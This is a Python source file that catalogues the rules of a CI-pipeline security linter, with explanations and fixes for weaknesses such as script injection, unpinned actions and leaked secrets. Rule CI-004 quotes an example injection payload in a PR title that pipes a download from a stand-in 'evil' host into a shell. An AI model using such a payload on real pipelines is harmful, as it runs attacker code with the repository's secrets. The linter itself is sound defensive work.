"""Rule catalog for --check-ci: ids, severities and texts in one place (feeds --explain and docs/RULES.md)."""
from __future__ import annotations

from dataclasses import dataclass

from checksnap.core import Severity


@dataclass(frozen=True)
class RuleInfo:
    id: str
    severity: Severity
    title: str
    explanation: str
    fix_hint: str
    needs_snap: bool = False


I, L, M, H = Severity.INFO, Severity.LOW, Severity.MEDIUM, Severity.HIGH

_RULES = [
    ("CI-001", L, "Action pinned to a tag, not a commit SHA",
     "A tag such as `@v4` can be moved by the action's owner (or an attacker who takes over the repo), so the code your pipeline runs can change without any commit on your side.",
     "Pin to the full 40-character commit SHA and keep the tag in a comment: `uses: actions/checkout@<sha> # v4`; let Dependabot/Renovate bump it."),
    ("CI-002", H, "Action or workflow referenced by branch (@main / @master) or a non-version ref",
     "A branch ref runs whatever is on that branch right now, on every build. One bad push upstream executes in your pipeline with your secrets.",
     "Pin to a release tag at minimum, ideally a commit SHA."),
    ("CI-003", H, "pull_request_target with checkout of the PR head",
     "`pull_request_target` runs with secrets and a write token. Checking out the pull request's code in that context and running it (build, tests, scripts) hands both to anyone who can open a PR.",
     "Use `pull_request` for untrusted code, or split into two workflows: build untrusted code without secrets, then comment/deploy from a trusted `workflow_run`."),
    ("CI-004", H, "Script injection: untrusted ${{ github.event.* }} used inside run:",
     "`${{ }}` is expanded into the shell script text before it runs. A PR title, branch name or comment such as `\"; curl evil | sh #` becomes part of the command.",
     "Pass the value through an environment variable (`env: TITLE: ${{ github.event.pull_request.title }}`) and use `\"$TITLE\"` in the script."),
    ("CI-005", M, "No permissions: block (token gets the repository default)",
     "Without `permissions:` the GITHUB_TOKEN gets the repository or organization default, which is often read-write on everything. A compromised step can push code, tags or releases.",
     "Add `permissions: contents: read` at the top of the workflow and grant extra scopes per job only where needed."),
    ("CI-006", H, "permissions: write-all",
     "Grants the GITHUB_TOKEN every write scope (contents, packages, actions, pull requests, ...) to every step, including third-party actions.",
     "List only the scopes the job needs, for example `contents: read` and `pull-requests: write`."),
    ("CI-007", H, "Secret echoed or printed in a run step",
     "Printing a secret puts it in the build log. Masking is best effort and is defeated by encoding (base64, splitting, reversing), and logs are readable by everyone with repo access.",
     "Never print secrets. To check that one is set, test `[ -n \"$X\" ]` without echoing it."),
    ("CI-008", L, "Job without timeout-minutes",
     "The default job timeout is 6 hours on GitHub. A hung test or network call burns runner minutes (and money) until it hits that limit.",
     "Add `timeout-minutes:` to each job, about twice its normal duration."),
    ("CI-009", L, "Deploy job without concurrency control",
     "Two pushes in quick succession start two deploys at once; they can interleave and leave production in a mixed state or an older version.",
     "Add `concurrency: { group: deploy-${{ github.ref }}, cancel-in-progress: false }` to the workflow or the deploy job."),
    ("CI-010", M, "curl | bash (pipe a download into a shell)",
     "Runs whatever the server returns, unreviewed and unpinned; a truncated download can also execute half a script.",
     "Download to a file, verify a checksum or signature, then run it; or use a pinned package/action."),
    ("CI-011", M, "continue-on-error: true on a critical step",
     "Tests, security scans, lint and deploy steps that cannot fail the build give a green pipeline with real problems hidden.",
     "Remove it, or move the non-blocking experiment to its own job and keep the critical step blocking."),
    ("CI-012", I, "Package install without dependency caching",
     "Reinstalling dependencies on every run wastes minutes and makes the build depend on the registry being up.",
     "Use the `cache:` option of `actions/setup-node|python|...`, `actions/cache`, or GitLab `cache:` keyed on the lock file."),
    ("CI-013", M, "Deprecated workflow command (set-output, save-state, set-env, add-path)",
     "`::set-output` and `::save-state` are deprecated and `::set-env` / `::add-path` were disabled because of injection risk; they will stop working or warn on every run.",
     "Write to the files instead: `echo \"name=value\" >> \"$GITHUB_OUTPUT\"`, `>> \"$GITHUB_ENV\"`, `>> \"$GITHUB_PATH\"`."),
    ("CI-014", I, "runs-on: *-latest (runner image drifts)",
     "`ubuntu-latest` moves to a new OS version on GitHub's schedule, so a build that was green yesterday can break with no change from you.",
     "Pin the version (`ubuntu-24.04`) and upgrade deliberately."),
    ("CI-015", I, "Long test job without a build matrix",
     "A job with many steps that runs tests against one runtime version only; a longer pipeline is slower to debug and hides version-specific failures.",
     "Use `strategy.matrix` for the versions/OSes you support, and split lint, test and build into separate jobs so they run in parallel."),
    ("CI-016", M, "GitLab image uses the :latest tag",
     "`:latest` changes under you: the same commit can pass today and fail tomorrow, and you cannot reproduce an old build.",
     "Pin an explicit version tag, ideally a digest (`image: node:20.11-alpine`)."),
    ("CI-017", M, "GitLab deploy job without rules / only / when: manual",
     "A deploy job with no `rules:`/`only:` runs on every branch and merge request, so any pushed branch can deploy.",
     "Add `rules: - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH` and/or `when: manual`."),
    ("CI-018", H, "Secret-looking variable with a plain-text value",
     "A password/token/key written in the pipeline file is visible to everyone with read access and stays in git history. The report shows only the variable name.",
     "Define it as a masked, protected CI/CD variable (GitLab Settings or GitHub secrets) and reference it as `$NAME` / `${{ secrets.NAME }}`; rotate the leaked value."),
]
RULES: dict[str, RuleInfo] = {r[0]: RuleInfo(*r) for r in _RULES}
